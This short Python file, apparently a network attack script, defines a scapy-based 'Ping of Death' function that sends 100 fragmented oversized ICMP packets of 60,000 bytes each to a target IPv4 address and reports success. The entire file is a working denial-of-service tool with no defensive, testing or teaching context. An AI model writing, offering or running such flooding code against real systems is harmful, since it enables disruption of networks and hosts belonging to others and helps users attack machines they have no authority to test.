import sys
import time
from scapy.all import send, fragment, IP, ICMP, ARP, sr1

def pod(ipv4, count=100, size=60000):

    try:
        for _ in range(count):
            send(fragment(IP(dst=ipv4)/ICMP()/("X"*size)), verbose=0)
            time.sleep(0.1)
        print("POD executed successfully!")
    except Exception as e:
        print(f'POD Error: {e}')

